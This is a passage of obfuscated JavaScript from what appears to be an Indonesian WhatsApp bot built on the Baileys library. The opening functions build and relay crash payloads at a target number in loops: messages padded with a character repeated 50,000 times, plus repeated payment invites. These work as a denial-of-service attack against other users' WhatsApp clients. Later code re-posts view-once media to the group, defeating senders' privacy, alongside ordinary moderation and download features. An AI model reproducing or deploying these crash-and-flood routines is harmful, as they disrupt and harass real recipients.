          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x48dad7
      });
      await _0x59f5fa.relayMessage(_0x48dad7, _0x332de7.message, {
        'participant': {
          'jid': _0x48dad7
        },
        'messageId': _0x332de7.key.id
      });
    }
    async function _0xf58f62(_0x59683d) {
      let _0x572100 = generateWAMessageFromContent(_0x59683d, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x59683d
      });
      await _0x59f5fa.relayMessage(_0x59683d, _0x572100.message, {
        'participant': {
          'jid': _0x59683d
        },
        'messageId': _0x572100.key.id
      });
    }
    async function _0x2d4467(_0x5545de) {
      _0x59f5fa.relayMessage(_0x5545de, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x5545de,
            'participant': _0x5545de,
            'quotedMessage': {
              'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(0xc350)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x5545de
        }
      }, {
        'messageId': null
      });
    }
    async function _0x1202e8(_0x4c66b5) {
      _0x59f5fa.relayMessage(_0x4c66b5, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 0x5265c00
        }
      }, {
        'participant': {
          'jid': _0x4c66b5
        }
      });
    }
    async function _0x508bc2(_0x536d1b, _0x348705) {
      for (let _0x4429f5 = 0x0; _0x4429f5 < _0x348705; _0x4429f5++) {
        _0x1202e8(_0x536d1b);
        _0x2d4467(_0x536d1b);
        await sleep(0x1f4);
      }
    }
    async function _0x569c2a(_0x1bb0bf, _0x89a849) {
      for (let _0xc61635 = 0x0; _0xc61635 < _0x89a849; _0xc61635++) {
        _0x1e2311(_0x1bb0bf);
        _0xf58f62(_0x1bb0bf);
        _0x567613(_0x1bb0bf);
        await sleep(0x1f4);
      }
    }
    async function _0x2de026(_0x3c5836, _0x28a197) {
      for (let _0x2aa7a2 = 0x0; _0x2aa7a2 < _0x28a197; _0x2aa7a2++) {
        _0x567613(_0x3c5836);
        _0x567613(_0x3c5836);
        _0x567613(_0x3c5836);
        await sleep(0x1f4);
      }
    }
    async function _0x159b95(_0x1ad80e, _0x15c42c) {
      for (let _0xcfef31 = 0x0; _0xcfef31 < _0x15c42c; _0xcfef31++) {
        _0xf58f62(_0x1ad80e);
        _0x1e2311(_0x1ad80e);
        await sleep(0x1f4);
      }
    }
    function _0x23bdb1(_0x445002, _0x58291d = [], _0x472121 = false) {
      return _0x472121 == null || _0x472121 == undefined || _0x472121 == false ? _0x59f5fa.sendMessage(_0x3f87c6.chat, {
        'text': _0x445002,
        'mentions': _0x58291d
      }, {
        'quoted': _0x3f87c6
      }) : _0x59f5fa.sendMessage(_0x3f87c6.chat, {
        'text': _0x445002,
        'mentions': _0x58291d
      }, {
        'quoted': _0x3f87c6
      });
    }
    async function _0xf0066(_0x3621a0, _0x1ea55a, _0x5d33fb) {
      let _0x392b60 = ['' + _0x3621a0, '' + _0x1ea55a, '' + _0x5d33fb];
      let {
        key: _0xd2b2db
      } = await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
        'text': "*Memuat...*"
      }, {
        'quoted': _0x3f87c6
      });
      for (let _0x111e7c = 0x0; _0x111e7c < _0x392b60.length; _0x111e7c++) {
        await sleep(0x7d0);
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'text': _0x392b60[_0x111e7c],
          'edit': _0xd2b2db
        });
      }
    }
    ;
    ;
    ;
    function _0x3440b3(_0x4f6b09) {
      if (_0x4f6b09 === 0x0) {
        return "0 Byte";
      }
      const _0x57a224 = ["Byte", 'KB', 'MB', 'GB', 'TB'];
      const _0x1dc14b = Math.floor(Math.log(_0x4f6b09) / Math.log(0x400));
      return parseFloat((_0x4f6b09 / Math.pow(0x400, _0x1dc14b)).toFixed(0x2)) + " " + _0x57a224[_0x1dc14b];
    }
    function _0x45411f(_0x49ba0e) {
      let _0x293ede = Math.floor(_0x49ba0e / 0x3e8 % 0x3c);
      let _0x2849ca = Math.floor(_0x49ba0e / 60000 % 0x3c);
      let _0x4fb0a2 = Math.floor(_0x49ba0e / 3600000 % 0x18);
      return _0x4fb0a2.toString().padStart(0x2, '0') + ':' + _0x2849ca.toString().padStart(0x2, '0') + ':' + _0x293ede.toString().padStart(0x2, '0');
    }
    function _0x470f24(_0x1395bd, _0x2b9c6b = {}) {
      const {
        locale = "id-ID",
        style = "decimal",
        currency = 'IDR',
        minimumFractionDigits = 0x0,
        maximumFractionDigits = 0x2
      } = _0x2b9c6b;
      return new Intl.NumberFormat(locale, {
        'style': style,
        'currency': currency,
        'minimumFractionDigits': minimumFractionDigits,
        'maximumFractionDigits': maximumFractionDigits
      }).format(_0x1395bd);
    }
    ;
    if (!_0x3f87c6.isGroup && !_0x2cfe7f && !_0x256404 && db.data.settings[_0xb3f81d].onlygc) {
      if (_0x4ac520) {
        let _0x4f5528 = "⚠️ *「 WARNING 」* ⚠️\n";
        _0x4f5528 += "Hai! 👋 Bot ini hanya bisa digunakan di grup.\n\n";
        _0x4f5528 += "🤔 Ingin bot aktif di grup Kamu?\n";
        _0x4f5528 += "*Sewa atau beli premium sekarang!*\n\n";
        _0x4f5528 += "Hubungi admin: wa.me/" + ownerNumber;
        return _0x3a091f(_0x4f5528);
      }
    }
    ;
    if (!_0x2cfe7f && db.data.settings[_0xb3f81d].onlypc && _0x3f87c6.isGroup) {
      if (_0x4ac520) {
        let _0x4c7a24 = "⚠️ *「 WARNING 」* ⚠️\n";
        _0x4c7a24 += "Hai! 👋 Bot ini hanya bisa digunakan di private chat.\n\n";
        _0x4c7a24 += "🤔 Ingin bot aktif di chat Kamu?\n";
        _0x4c7a24 += "*Sewa atau beli premium sekarang!*\n\n";
        _0x4c7a24 += "Hubungi admin: wa.me/" + ownerNumber;
        return _0x3a091f(_0x4c7a24);
      }
    }
    if (_0x7a39b5 && !_0x3f87c6.isNewsletter) {
      if (!_0x3f87c6.isGroup && _0x2bee7f && !_0x3f87c6.key.fromMe) {
        db.data.users[_0x3f87c6.sender].pctime = new Date().getTime();
      }
      ;
      if (!_0x3f87c6.isGroup && !_0x2bee7f && !_0x3f87c6.key.fromMe) {
        const _0x478cec = new Date().getTime() - db.data.users[_0x3f87c6.sender].pctime;
        if (_0x478cec > 0x1499700) {
          db.data.users[_0x3f87c6.sender].pctime = new Date().getTime();
          let _0xd8d76e = "Halo Kak " + _0xdd1e8d + "! 👋\n\nMohon diperhatikan! Nomor ini sekarang digunakan sebagai bot dan tidak lagi dikelola langsung oleh owner sebelumnya. Jika Kakak memiliki keperluan atau ingin menghubungi owner, silakan hubungi nomor terbaru berikut:\n\n📞 *wa.me/" + ownerNumber + "*\n\nBot ini siap membantu Kakak dengan berbagai fitur yang tersedia. Silakan pilih menu di bawah ini untuk memulai! Terima kasih atas perhatiannya. 😊";
          const _0x4206b9 = [{
            'name': "single_select",
            'buttonParamsJson': JSON.stringify({
              'title': "📌 Pilih Opsi",
              'sections': [{
                'title': "🔹 Opsi Menu",
                'rows': [{
                  'header': "🎁 Menu Utama",
                  'title': "Lihat semua fitur keren yang tersedia! 🌟",
                  'id': _0x4773c6 + "menu"
                }, {
                  'header': "🛃 Daftar Sekarang",
                  'title': "Gabung untuk akses fitur premium! 🎟️",
                  'id': _0x4773c6 + 'daftar'
                }, {
                  'header': "📞 Hubungi Owner",
                  'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                  'id': _0x4773c6 + "owner"
                }]
              }]
            })
          }];
          _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x4206b9, _0xd8d76e, footer, _0x3f87c6);
        }
      }
    }
    ;
    if (db.data.users[_0x3f87c6.sender].exp > 0x9c4) {
      try {
        avatar = await _0x59f5fa.profilePictureUrl(_0x3f87c6.sender, "image");
      } catch {
        avatar = imageUrl;
      }
      db.data.users[_0x3f87c6.sender].exp = 0x0;
      db.data.users[_0x3f87c6.sender].level += 0x1;
      await sleep(0x3e8);
      let _0x2c885b = [{
        'name': 'cta_url',
        'buttonParamsJson': JSON.stringify({
          'display_text': "🐬 My Handsome Owner",
          'url': "https://api.whatsapp.com/send/?phone=" + ownerNumber,
          'merchant_url': "https://api.whatsapp.com/send/?phone=" + ownerNumber
        })
      }];
      let _0x560454 = '';
      _0x560454 += "*🎉 C O N G R A T S 🎉*\n\n";
      _0x560454 += '*' + (db.data.users[_0x3f87c6.sender].level - 0x1) + "* *➔* *" + db.data.users[_0x3f87c6.sender].level + "*\n\n";
      _0x560454 += "- 🧬 *Level Sebelumnya*: " + (db.data.users[_0x3f87c6.sender].level - 0x1) + "\n";
      _0x560454 += "- 🧬 *Level Baru*: " + db.data.users[_0x3f87c6.sender].level + "\n";
      _0x560454 += "- *Pada Jam*: " + new Date().toLocaleString("id-ID");
      _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x2c885b, _0x560454, footer, _0x3f87c6);
      if (db.data.users[_0x3f87c6.sender].rank < 0x1) {
        db.data.users[_0x3f87c6.sender].rank = 0x0;
      }
    }
    if (!_0x59f5fa["public"]) {
      if (!_0x2cfe7f && !_0x3f87c6.key.fromMe) {
        return;
      }
    }
    ;
    if (db.data.settings[_0xb3f81d].online) {
      if (_0x4ac520) {
        _0x59f5fa.sendPresenceUpdate("unavailable", _0x3f87c6.chat);
      }
    }
    if (db.data.settings[_0xb3f81d].autoread) {
      _0x59f5fa.readMessages([_0x3f87c6.key]);
    }
    if (db.data.settings[_0xb3f81d].autobio) {
      _0x59f5fa.updateProfileStatus(botName + " Telah Berjalan Selama " + runtime(process.uptime()))["catch"](_0x85c588 => _0x85c588);
    }
    if (db.data.settings[_0xb3f81d].autorecordtype) {
      if (_0x4ac520) {
        let _0x2a0c5c = ["composing", "recording"];
        let _0x47bdb1 = _0x2a0c5c[Math.floor(_0x2a0c5c.length * Math.random())];
        _0x59f5fa.sendPresenceUpdate(_0x47bdb1, _0x3f87c6.chat);
      }
    }
    if (db.data.settings[_0xb3f81d].autorecord) {
      if (_0x4ac520) {
        let _0x51d73f = ["recording"];
        let _0x639192 = _0x51d73f[Math.floor(_0x51d73f.length * Math.random())];
        _0x59f5fa.sendPresenceUpdate(_0x639192, _0x3f87c6.chat);
      }
    }
    if (db.data.settings[_0xb3f81d].autotype) {
      if (_0x4ac520) {
        let _0x104d3a = ['composing'];
        _0x59f5fa.sendPresenceUpdate(_0x104d3a, _0x3f87c6.chat);
      }
    }
    if (_0x3f87c6.sender.startsWith('' + autoblocknumber) && db.data.settings[_0xb3f81d].autoblocknum === true) {
      return _0x59f5fa.updateBlockStatus(_0x3f87c6.sender, "block");
    }
    if (!_0x3f87c6.sender.startsWith('' + antiforeignnumber) && db.data.chats[_0x3f87c6.chat].antiforeignnum === true) {
      if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {
        return;
      }
      _0x59f5fa.sendMessage(_0x3f87c6.chat, {
        'text': "Maaf, Kamu akan dihapus karena admin/owner grup telah mengaktifkan anti-nomor asing, hanya kode negara +" + antiforeignnumber + " yang boleh bergabung"
      }, {
        'quoted': _0x3f87c6
      });
      await sleep(0x7d0);
      await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x3f87c6.sender], "remove");
    }
    cron.schedule("00 00 * * *", () => {
      let _0xe9e8ed = Object.keys(db.data.users);
      for (let _0x2bcfd1 of _0xe9e8ed) {
        const _0x3fe0c2 = db.data.users[_0x2bcfd1].vip ? global.limit.vip : checkPremiumUser(_0x2bcfd1, premium) ? global.limit.premium : global.limit.free;
        db.data.users[_0x2bcfd1].limit = _0x3fe0c2;
      }
      console.log("Limit semua user berhasil di-reset!");
    }, {
      'scheduled': true,
      'timezone': 'Asia/Jakarta'
    });
    if (_0x2bee7f && !_0x3f87c6.isNewsletter) {
      if (_0x3f87c6.isGroup) {
        _0x3f87c6.pushName;
      } else {
        "Private Chat";
      }
      console.log(chalk.black.bgWhite("[ MESSAGE ]:"), chalk.black.bgGreen(new Date()), chalk.black.bgHex("#00EAD3")(_0x7a39b5 || _0x3f87c6.type) + "\n" + chalk.black(chalk.bgCyanBright("[ FROM ] :"), chalk.bgYellow(_0x3f87c6.pushName), chalk.bgHex("#FF449F")(_0x3f87c6.sender), chalk.bgBlue('(' + _0x3f87c6.chat + ')')));
    }
    ;
    if (db.data.chats[_0x3f87c6.chat].antiviewonce && _0x3f87c6.isGroup && _0x3f87c6.mtype == "viewOnceMessageV2") {
      let _0xc6ab3b = await _0x3f87c6.download();
      let _0xee9946 = await getContentType(_0x3f87c6.message.viewOnceMessageV2.message);
      let _0xfa506a = "✨ *ANTI VIEW ONCE MESSAGE* ✨\n\n";
      _0xfa506a += "*Info Pesan*:\n";
      _0xfa506a += "- Nama: " + _0x3f87c6.pushName + "\n";
      _0xfa506a += "- User: @" + _0x3f87c6.sender.split('@')[0x0] + "\n";
      _0xfa506a += "- Waktu: " + time + "\n";
      _0xfa506a += "- Keterangan: " + (_0x7a39b5 ? _0x7a39b5 : "Enggak ada keterangannya, kak.") + "\n\n";
      _0xfa506a += "💌 KoKoRey tampilkan isi pesannya di bawah ya! 😉";
      if (_0xee9946 == "videoMessage") {
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'video': _0xc6ab3b,
          'caption': _0xfa506a,
          'mentions': [_0x3f87c6.sender]
        }, {
          'quoted': _0x3f87c6
        });
      } else {
        if (_0xee9946 == "imageMessage") {
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'image': _0xc6ab3b,
            'caption': _0xfa506a,
            'mentions': [_0x3f87c6.sender]
          }, {
            'quoted': _0x3f87c6
          });
        } else if (_0xee9946 == "audioMessage") {
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'audio': _0xc6ab3b,
            'mimetype': 'audio/mp4',
            'ptt': true
          }, {
            'quoted': _0x3f87c6
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antibot) {
      if (_0x3f87c6.isBaileys) {
        if (_0x3f87c6.key.fromMe || _0x5312e8 || _0x2cfe7f || !_0x26a295 || _0x295873) {
          return;
        }
        let _0x39a7e3 = ["Ehh bot, ngapain masuk grup ini? Sini tempat manusia ngobrol, bukan robot! 🚫 Keluar sana!", "Hei bot, siapa suruh masuk? Kamu gak diundang kok nyelonong. Jangan balik lagi, ya! 👋", "Bot nyasar detected! Sayangnya Kamu gak diterima di sini. Silakan cari grup lain buat main-main. Bye! ✋", "Aduh, bot datang lagi? Nih grup cuma buat manusia, jadi maaf ya, Kamu harus keluar. Jangan coba-coba masuk lagi! 😤", "Bot? Lagi? Hadehh, sini bukan tempat buat Kamu, ya. Out sekarang juga atau KoKoRey usir paksa! 🚪", "Eits, bot nyelonong masuk! Grup ini cuma buat manusia. Makasih udah mampir, tapi maaf, Kamu di-kick dulu! 😏", "Bot detected! Ngapain coba? Grup ini gak buat robot. Bye-bye ya, jangan balik lagi! 🚷", "Lho, siapa lagi nih bot gak jelas? Sana balik ke tempatmu, di sini Kamu gak diterima. Keluar cepat! 🚨", "Bot ketahuan nyasar! Kalau mau eksis, cari grup lain aja. Sini bukan tempat buat Kamu. Bye! 👋", "Halo bot, ngapain masuk sini? Nyasar ya? Sana pergi sebelum KoKoRey usir dengan hormat! 😎", "Bot is not allowed here. Cuma buat manusia aja yang bisa gabung. Jangan masuk lagi ya, ini peringatan terakhir! 🚫", "Bot detected! Sorry not sorry, grup ini anti bot. Selamat tinggal dan jangan kembali lagi. 🛑", "Woi bot, pikir ini taman bermain? Sana balik ke tempat asalmu. Di sini gak butuh Kamu! 🚪", "Grup ini anti bot, ngerti? Jangan sok-sokan masuk tanpa izin. Keluar sekarang juga! 😤", "Bot alert! Kamu udah melanggar aturan grup ini. Silakan keluar sebelum KoKoRey kasih surat cinta: kick out! 📨"];
        let _0x2dc0c2 = _0x39a7e3[Math.floor(Math.random() * _0x39a7e3.length)];
        await _0x3f87c6.react('⚠️');
        await _0x3a091f(_0x2dc0c2);
        await sleep(0x5dc);
        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'delete': _0x3f87c6.key
        });
        await sleep(0x5dc);
        await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x3f87c6.sender], "remove");
      }
    }
    ;
    if (db.data.chats[_0x3f87c6.chat].antispam) {
      if (_0x3f87c6.isGroup && _0x3f87c6.message && isFiltered(_0x3f87c6.chat)) {
        console.log('[SPAM]', color(moment(_0x3f87c6.messageTimestamp * 0x3e8).format("DD/MM/YYYY HH:mm:ss"), 'yellow'), color(_0x4ac520 + " [" + _0x143458.length + ']'), "dari", color(_0x3f87c6.pushName));
        if (_0x3f87c6.key.fromMe || _0x5312e8 || _0x2cfe7f || !_0x26a295) {
          return;
        }
        await _0x3a091f("Hei @" + _0x3f87c6.sender.split('@')[0x0] + ", grup ini bukan tempat buat spam ya! 🤨\nSilakan cari tempat lain buat aksi Kamu. Bye-bye! 👋");
        await sleep(0x3e8);
        return await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x3f87c6.sender], 'remove');
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antimedia && _0x14f228) {
      if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
        return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
          'delete': {
            'remoteJid': _0x3f87c6.chat,
            'fromMe': false,
            'id': _0x3f87c6.key.id,
            'participant': _0x3f87c6.key.participant
          }
        });
      }
    }
    if (db.data.chats[_0x3f87c6.chat].image && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "imageMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antivideo && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "videoMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antisticker && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "stickerMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antiaudio && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "audioMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antilocation && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "locationMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    if (db.data.chats[_0x3f87c6.chat].antidocument && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "documentMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    ;
    if (db.data.chats[_0x3f87c6.chat].anticontact && _0x3f87c6.mtype) {
      if (_0x3f87c6.mtype === "contactMessage") {
        if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'fromMe': false,
              'id': _0x3f87c6.key.id,
              'participant': _0x3f87c6.key.participant
            }
          });
        }
      }
    }
    ;
    if (db.data.chats[_0x3f87c6.chat].badword) {
      if (_0x2cfe7f || _0x5312e8 || !_0x26a295) {} else {
        for (let _0x40b31e of bad) {
          const _0x57600b = new RegExp("\\b" + _0x40b31e + "\\b", 'i');
          if (_0x57600b.test(_0x7a39b5)) {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'delete': {
                'remoteJid': _0x3f87c6.chat,
                'fromMe': false,
                'id': _0x3f87c6.key.id,
                'participant': _0x3f87c6.key.participant
              }
            });
            if (!db.data.users[_0x3f87c6.sender]) {
              db.data.users[_0x3f87c6.sender] = {
                'badword': 0x0
              };
            }
            db.data.users[_0x3f87c6.sender].badword += 0x1;
            if (db.data.users[_0x3f87c6.sender].badword > 0x5) {
              try {
                if (_0x3f87c6.isGroup && _0x26a295) {
                  await _0x59f5fa.groupParticipantsUpdate(_0x3f87c6.chat, [_0x3f87c6.sender], "remove");
                  await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                    'text': "🚫 Maaf, @" + _0x3f87c6.sender.split('@')[0x0] + " telah di-kick karena melanggar aturan (mengirimkan kata terlarang sebanyak 5 kali).",
                    'mentions': [_0x3f87c6.sender]
                  });
                  db.data.users[_0x3f87c6.sender].badword = 0x0;
                }
              } catch (_0x161fc8) {
                console.error("Gagal melakukan kick:", _0x161fc8);
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'text': "⚠️ Ups, KoKoRey gagal kick pengguna ini. Pastikan bot memiliki hak admin!"
                });
              }
            } else {
              const _0x220c6f = 0x5 - db.data.users[_0x3f87c6.sender].badword;
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "⚠️ @" + _0x3f87c6.sender.split('@')[0x0] + ", Kamu telah melanggar aturan dengan mengirimkan kata terlarang (" + db.data.users[_0x3f87c6.sender].badword + "/5). Jika melanggar " + _0x220c6f + " kali lagi, Kamu akan di-kick!",
                'mentions': [_0x3f87c6.sender]
              });
            }
            break;
          }
        }
      }
    }
    if (db.data.settings[_0xb3f81d].autodownload && !_0x3f87c6.key.fromMe && !_0x2bee7f) {
      try {
        const _0xd1fb18 = /(?:https?:\/\/)?(?:www\.)?instagram\.com\/(?:p|reel|stories|[\w.-]+)\/(?:[\w.-]+\/)?(?:\?.*)?$/i;
        const _0x5a6b9f = /(?:https?:\/\/)?(?:www\.|vm\.)?tiktok\.com\/(?:@[\w.-]+\/video\/\d+|[\w.-]+\/video\/\d+|[\w.-]{9})/i;
        const _0x190cc7 = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;
        if (_0xd1fb18.test(_0x7a39b5)) {
          await _0x3f87c6.react('⏱️');
          const _0x1a9c82 = await igdl(_0x7a39b5);
          if (_0x1a9c82.length > 0x0) {
            let _0xdb82e8 = "📥 *Instagram Downloader*\n\n";
            _0xdb82e8 += "📌 *Creator*: " + (_0x1a9c82[0x0].wm || "Tidak diketahui") + "\n";
            _0xdb82e8 += "✅ *Status*: Download Berhasil";
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x1a9c82[0x0].url
              },
              'caption': _0xdb82e8
            }, {
              'quoted': _0x3f87c6
            });
          } else {
            _0x3a091f("Gagal mengambil data dari Instagram.");
          }
          await _0x3f87c6.react('✅');
        } else {
          if (_0x5a6b9f.test(_0x7a39b5)) {
            await _0x3f87c6.react('⏱️');
            const _0x44fecb = await ttdl(_0x7a39b5);
            if (_0x44fecb && _0x44fecb.video.length > 0x0) {
              let _0x9a8677 = "📥 *TikTok Downloader*\n\n";
              _0x9a8677 += "📌 *Judul*: " + (_0x44fecb.title || "Tidak diketahui") + "\n";
              _0x9a8677 += "🎥 *Creator*: " + (_0x44fecb.creator || "Tidak diketahui") + "\n";
              _0x9a8677 += "✅ *Status*: Download Berhasil";
              _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'video': {
                  'url': _0x44fecb.video[0x0]
                },
                'caption': _0x9a8677
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              _0x3a091f("Gagal mengambil data dari TikTok.");
            }
            await _0x3f87c6.react('✅');
          } else {
            if (_0x190cc7.test(_0x7a39b5)) {
              await _0x3f87c6.react('⏱️');
              const _0x252962 = await youtube(_0x7a39b5);
              if (_0x252962 && _0x252962.mp4) {
                let _0x42285c = "📥 *YouTube Downloader*\n\n";
                _0x42285c += "📌 *Judul*: " + _0x252962.title + "\n";
                _0x42285c += "🎥 *Creator*: " + (_0x252962.name || "Tidak diketahui") + "\n";
                _0x42285c += "👀 *Views*: " + _0x470f24(_0x252962.views || '0') + "\n";
                _0x42285c += "⏳ *Upload*: " + (_0x252962.ago || "Tidak diketahui") + "\n";
                _0x42285c += "✅ *Status*: Download Berhasil";
                _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'video': {
                    'url': _0x252962.mp4
                  },
                  'caption': _0x42285c
                }, {
                  'quoted': _0x3f87c6
                });
              } else {
                _0x3a091f("Gagal mengambil data dari YouTube.");
              }
              await _0x3f87c6.react('✅');
            }
          }
        }
      } catch (_0x4f45b1) {
        console.error(_0x4f45b1);
        await _0x3f87c6.react('😔');
        await _0x3a091f("Terjadi kesalahan saat mendownload.");
      }
    }
    if (db.data.settings[_0xb3f81d].autosticker && !_0x3f87c6.isGroup && !_0x3f87c6.key.fromMe) {
      if (/image/.test(_0x3df746) && !/webp/.test(_0x3df746)) {
        let _0x21df49 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
        await _0x3f87c6.react('⏱️');
        await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x21df49, _0x3f87c6, {
          'packname': global.packname,
          'author': global.author
        });
      } else {
        if (/video/.test(_0x3df746)) {
          if ((_0x5dba36.msg || _0x5dba36).seconds > 0xb) {
            return;
          }
          let _0x26990a = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          await _0x3f87c6.react('⏱️');
          await _0x59f5fa.sendVideoAsSticker(_0x3f87c6.chat, _0x26990a, _0x3f87c6, {
            'packname': global.packname,
            'author': global.author
          });
        }
      }
    }
    if (db.data.settings[_0xb3f81d].safesearch && _0x4ac520 && !_0x3f87c6.key.fromMe && !_0x2cfe7f) {
      try {
        if (_0x7a39b5.match(/\b(colmek|coli||anjing||ajg||anjg||anj||memek||mmek||mmk||taik||bangsat||bgst||babi||tolol||brengsek||gblk||goblok|desah|bokep|tobrut|seksi|sex|sexy|memek|kontol|titit|telanjang|ngentod|ngentot|ngewe|ewe|ewean)\b/i)) {
          await _0x3f87c6.react('⚠️');
          await _0x3a091f("🚫 Ups, kata tersebut dilarang di sini ya, kak! Mari jaga lingkungan chat ini tetap positif dan nyaman untuk semua orang. 😊");
          if (!db.data.users[_0x3f87c6.chat]) {
            db.data.users[_0x3f87c6.chat] = {
              'badword': 0x0
            };
          }
          db.data.users[_0x3f87c6.chat].badword += 0x1;
          if (db.data.users[_0x3f87c6.chat].badword > 0x5) {
            await _0x3f87c6.react('☠️');
            await _0x3a091f("Kamu telah mengetik hal yang tidak senonoh sebanyak 5 kali, maaf Kamu akan diblokir!");
            try {
              await _0x59f5fa.updateBlockStatus(_0x3f87c6.sender, "block");
              await _0x3a091f("Pengguna @" + _0x3f87c6.sender.split('@')[0x0] + " telah diblokir. 🌐");
            } catch (_0x2b904c) {
              console.error("Gagal memblokir pengguna:", _0x2b904c);
              await _0x3a091f("⚠️ KoKoRey gagal memblokir pengguna ini. Pastikan bot memiliki izin yang cukup.");
            }
            db.data.users[_0x3f87c6.chat].badword = 0x0;
          } else {
            const _0x2de22e = 0x5 - db.data.users[_0x3f87c6.chat].badword;
            await _0x3a091f("⚠️ Kamu telah melanggar aturan sebanyak " + db.data.users[_0x3f87c6.chat].badword + "/5 kali. Jika melanggar " + _0x2de22e + " kali lagi, Kamu akan diblokir!");
          }
          return;
        }
      } catch (_0x31dcec) {
        console.error("Terjadi kesalahan:", _0x31dcec);
      }
    }
    if (!_0x2cfe7f && !_0x3f87c6.key.fromMe && _0x3f87c6.message) {
      if (_0x7a39b5.match('@' + ownerNumber)) {
